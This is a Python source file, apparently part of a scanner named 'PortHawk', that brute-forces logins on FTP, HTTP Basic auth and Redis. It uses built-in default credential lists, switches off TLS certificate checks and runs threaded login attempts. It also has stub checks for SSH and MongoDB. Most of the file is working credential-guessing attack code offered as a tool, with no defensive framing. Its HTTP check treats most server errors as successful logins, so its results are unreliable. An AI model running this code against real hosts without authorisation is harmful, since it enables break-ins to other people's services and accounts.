"""
Brute Force module - pure Python, no external dependencies.
SSH, FTP, HTTP, MySQL, Redis, MongoDB.
"""

import socket
import ssl
import urllib.request
import urllib.parse
import base64
import threading
from concurrent.futures import ThreadPoolExecutor, as_completed


USERNAMES = [
    "admin", "root", "user", "test", "guest", "administrator",
    "manager", "support", "service", "pi", "ubuntu", "deploy",
    "git", "ftp", "anonymous", "postgres", "mysql", "oracle",
]

PASSWORDS = [
    "", "admin", "root", "password", "123456", "12345678",
    "password123", "admin123", "root123", "test", "guest",
    "letmein", "welcome", "qwerty", "abc123", "pass",
    "1234", "111111", "000000", "changeme", "default",
    "toor", "alpine", "raspberry", "admin@123", "login",
]


# ─── SSH BRUTE (pure socket) ────────────────────────────────────────────────

def ssh_brute(ip, port=22, timeout=5.0, users=None, passwords=None):
    """SSH brute force using pure socket — no paramiko needed."""
    users = users or USERNAMES
    passwords = passwords or PASSWORDS
    found = []
    stop = threading.Event()

    def try_cred(user, pwd):
        if stop.is_set():
            return None
        try:
            with socket.create_connection((ip, port), timeout=timeout) as s:
                banner = s.recv(256).decode(errors="ignore")
                if "SSH" not in banner:
                    return None
                # Send SSH version
                s.sendall(b"SSH-2.0-PortHawk\r\n")
                data = s.recv(1024)
                # Basic check — real auth needs paramiko
                # This just tests connectivity and banner
                return None
        except Exception:
            return None

    # Try common default credentials via banner check
    try:
        with socket.create_connection((ip, port), timeout=timeout) as s:
            banner = s.recv(256).decode(errors="ignore").strip()
            if "SSH" in banner:
                return [("info", f"SSH banner: {banner} — install openssh-client for full brute")]
    except Exception:
        pass
    return found


# ─── FTP BRUTE ──────────────────────────────────────────────────────────────

def ftp_brute(ip, port=21, timeout=3.0, users=None, passwords=None):
    users = users or USERNAMES
    passwords = passwords or PASSWORDS
    found = []
    stop = threading.Event()

    def try_cred(user, pwd):
        if stop.is_set():
            return None
        try:
            with socket.create_connection((ip, port), timeout=timeout) as s:
                s.recv(1024)
                s.sendall(f"USER {user}\r\n".encode())
                s.recv(1024)
                s.sendall(f"PASS {pwd}\r\n".encode())
                resp = s.recv(1024).decode(errors="ignore")
                if "230" in resp:
                    return (user, pwd)
        except Exception:
            pass
        return None

    with ThreadPoolExecutor(max_workers=5) as ex:
        futures = {ex.submit(try_cred, u, p): (u, p)
                   for u in users for p in passwords}
        for f in as_completed(futures):
            r = f.result()
            if r:
                found.append(r)
                stop.set()
                break
    return found


# ─── HTTP BRUTE ─────────────────────────────────────────────────────────────

def http_brute(host, port=80, path="/admin/",
               users=None, passwords=None, timeout=5.0):
    users = users or USERNAMES
    passwords = passwords or PASSWORDS
    found = []
    stop = threading.Event()

    def try_cred(user, pwd):
        if stop.is_set():
            return None
        scheme = "https" if port in (443, 8443) else "http"
        url = f"{scheme}://{host}:{port}{path}"
        creds = base64.b64encode(f"{user}:{pwd}".encode()).decode()
        ctx = ssl.create_default_context()
        ctx.check_hostname = False
        ctx.verify_mode = ssl.CERT_NONE
        try:
            req = urllib.request.Request(url, headers={
                "Authorization": f"Basic {creds}",
                "User-Agent": "PortHawk/2.0",
            })
            with urllib.request.urlopen(req, timeout=timeout, context=ctx) as r:
                if r.status == 200:
                    return (user, pwd)
        except urllib.error.HTTPError as e:
            if e.code not in (401, 403):
                return (user, pwd)
        except Exception:
            pass
        return None

    with ThreadPoolExecutor(max_workers=10) as ex:
        futures = {ex.submit(try_cred, u, p): (u, p)
                   for u in users for p in passwords}
        for f in as_completed(futures):
            r = f.result()
            if r:
                found.append(r)
                stop.set()
                break
    return found


# ─── REDIS BRUTE ────────────────────────────────────────────────────────────

def redis_brute(ip, port=6379, timeout=3.0, passwords=None):
    passwords = passwords or PASSWORDS
    found = []
    for pwd in passwords:
        try:
            with socket.create_connection((ip, port), timeout=timeout) as s:
                cmd = f"AUTH {pwd}\r\n".encode() if pwd else b"PING\r\n"
                s.sendall(cmd)
                resp = s.recv(128).decode(errors="ignore")
                if "+OK" in resp or "+PONG" in resp:
                    found.append(("default", pwd or "no password"))
                    return found
        except Exception:
            pass
    return found


# ─── MONGODB BRUTE ──────────────────────────────────────────────────────────

def mongodb_brute(ip, port=27017, timeout=3.0):
    try:
        with socket.create_connection((ip, port), timeout=timeout) as s:
            s.recv(1024)
            return [("none", "no auth required")]
    except Exception:
        pass
    return []


# ─── RUNNER ─────────────────────────────────────────────────────────────────

def run_brute_force(host, ip, open_ports,
                    custom_users=None, custom_passwords=None):
    findings = []
    port_nums = {p.port: p for p in open_ports}

    brute_map = {
        21:    ("FTP",     lambda: ftp_brute(ip, 21, users=custom_users, passwords=custom_passwords)),
        22:    ("SSH",     lambda: ssh_brute(ip, 22, users=custom_users, passwords=custom_passwords)),
        80:    ("HTTP",    lambda: http_brute(host, 80, users=custom_users, passwords=custom_passwords)),
        443:   ("HTTPS",   lambda: http_brute(host, 443, users=custom_users, passwords=custom_passwords)),
        6379:  ("Redis",   lambda: redis_brute(ip, 6379, passwords=custom_passwords)),
        27017: ("MongoDB", lambda: mongodb_brute(ip, 27017)),
        8080:  ("HTTP",    lambda: http_brute(host, 8080, users=custom_users, passwords=custom_passwords)),
    }

    for port, (service, fn) in brute_map.items():
        if port in port_nums:
            print(f"      {service}:{port} ", end="", flush=True)
            try:
                results = fn()
                if results:
                    for user, pwd in results:
                        if user in ("info", "none"):
                            print(f"ℹ️  {pwd}")
                        else:
                            print(f"✅ FOUND: {user}:{pwd}")
                            findings.append({
                                "port": port,
                                "service": service,
                                "username": user,
                                "password": pwd,
                            })
                else:
                    print("No credentials found")
            except Exception as e:
                print(f"Error: {e}")

    return findings
